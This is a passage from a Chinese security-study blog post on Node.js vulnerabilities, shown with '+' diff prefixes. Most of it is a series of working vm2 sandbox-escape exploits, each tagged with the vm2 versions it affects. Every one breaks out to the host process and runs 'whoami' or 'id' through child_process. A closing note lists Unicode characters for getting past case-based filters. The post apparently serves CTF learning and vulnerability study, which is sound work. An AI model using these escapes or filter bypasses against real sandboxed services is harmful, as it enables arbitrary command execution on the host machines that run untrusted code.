+<p>3.7.0&lt;=vm2&lt;=3.8.3</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrue<span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">""</span>)).a = <span class="number">1</span>;</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e.get_process(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">truetruetruegetOwnPropertyDescriptor()&#123;</span><br><span class="line">truetruetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)();</span><br><span class="line">truetruetrue&#125;</span><br><span class="line">truetrue&#125;));</span><br><span class="line">true&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.7.0&lt;=vm2&lt;=3.8.2</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">Symbol</span> = &#123;</span><br><span class="line">truetrue<span class="keyword">get</span> toStringTag()&#123;</span><br><span class="line">truetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)()</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">true&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">truetrue<span class="built_in">Symbol</span> = &#123;&#125;;</span><br><span class="line">truetrue<span class="keyword">return</span> f(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.6.7&lt;=vm2&lt;=3.6.9</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""),"",&#123;</span></span><br><span class="line"><span class="string">	value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			if(this.t)</span></span><br><span class="line"><span class="string">				throw Buffer.from;</span></span><br><span class="line"><span class="string">			this.t=true;</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.6.8</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">		getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">			delete this.getPrototypeOf;</span></span><br><span class="line"><span class="string">			Object.defineProperty(Object.prototype, "get", &#123;</span></span><br><span class="line"><span class="string">				get()&#123;</span></span><br><span class="line"><span class="string">					delete Object.prototype.get;</span></span><br><span class="line"><span class="string">					Function.prototype.__proto__ = null;</span></span><br><span class="line"><span class="string">					throw f=&gt;f.constructor("return process")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;);</span></span><br><span class="line"><span class="string">			return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;)&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.6.7</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(</span></span><br><span class="line"><span class="string">		Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),</span></span><br><span class="line"><span class="string">		"constructor").value("return process")().mainModule.require(</span></span><br><span class="line"><span class="string">		"child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2=3.6.6</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.__defineGetter__(Symbol.hasInstance,()=&gt;()=&gt;true);</span></span><br><span class="line"><span class="string">Buffer.from.constructor("return process")().mainModule.require("child_process").execSync("id").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.6.6</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">	process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.6.5</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">		Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">			throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">		&#125;&#125;);</span></span><br><span class="line"><span class="string">		return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">	&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt; =3.6.4</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.5.2</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">	Buffer.from(&#123;</span></span><br><span class="line"><span class="string">		valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">			throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">				getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">					throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">				&#125;</span></span><br><span class="line"><span class="string">			&#125;)</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">	process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>对于toUpperCase():</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"ı"</span>、<span class="string">"ſ"</span> 经过<span class="keyword">to</span>UpperCase处理后结果为 <span class="string">"I"</span>、<span class="string">"S"</span></span><br></pre></td></tr></table></figure>
+
+<p>对于toLowerCase():</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"K"</span>经过toLowerCase处理后结果为<span class="string">"k"</span><span class="comment">(这个K不是K)</span></span><br></pre></td></tr></table></figure>
+
+<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
+
+    </div>
+
+    
+    
+    
+      
+
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>0xCreed</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://0xcreed.jxustctf.top/2020/06/nodejs学习/" title="nodejs学习">https://0xcreed.jxustctf.top/2020/06/nodejs学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+		<div>
+		
+			
+				<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+			
+			
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/web/" rel="tag"> <i class="fa fa-tag"></i> web</a>
+			   
+            
+              <a href="/tags/js/" rel="tag"> <i class="fa fa-tag"></i> js</a>
+			   
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/06/6月刷题记录/" rel="next" title="6月刷题记录">
+                  <i class="fa fa-chevron-left"></i> 6月刷题记录
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/06/RCTF2020-复现/" rel="prev" title="RCTF2020-复现">
+                  RCTF2020-复现 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+	
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+	
+	  </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-原型链污染"><span class="nav-number">1.</span> <span class="nav-text">1.原型链污染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-危险函数"><span class="nav-number">2.</span> <span class="nav-text">2.危险函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-node-serialize反序列化RCE漏洞-CVE-2017-5941"><span class="nav-number">3.</span> <span class="nav-text">3.node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Node-js-目录穿越漏洞复现-CVE-2017-14849"><span class="nav-number">4.</span> <span class="nav-text">4.Node.js 目录穿越漏洞复现(CVE-2017-14849)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-VM沙箱逃逸"><span class="nav-number">5.</span> <span class="nav-text">5.VM沙箱逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javascript大小写特性"><span class="nav-number">6.</span> <span class="nav-text">javascript大小写特性</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/1.gif"
+      alt="0xCreed">
+  <p class="site-author-name" itemprop="name">0xCreed</p>
+  <div class="site-description" itemprop="description">Winter is coming</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/0xCreed" title="GitHub &rarr; https://github.com/0xCreed" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      推荐阅读
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/mwq1024/" title="https://www.cnblogs.com/mwq1024/" rel="noopener" target="_blank">旧博客</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">PH牛</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://li1m.github.io/" title="https://li1m.github.io/" rel="noopener" target="_blank">LiM</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+	  
+	  
+	
+
+    </div>
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+      <style>
+    #aplayer {
+        width: 50%;
+        margin: 0 auto;
+    }
+    @media screen and (max-device-width: 400px) {
+        #aplayer {
+            width: 100%;
+        }
+    }
+      </style>
+      <link rel="stylesheet" href="/dist/APlayer.min.css">
+      <div id="aplayer"></div>
+      <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+      <script type="text/javascript" src="/dist/music.js"></script>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xCreed</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">234k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:32</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
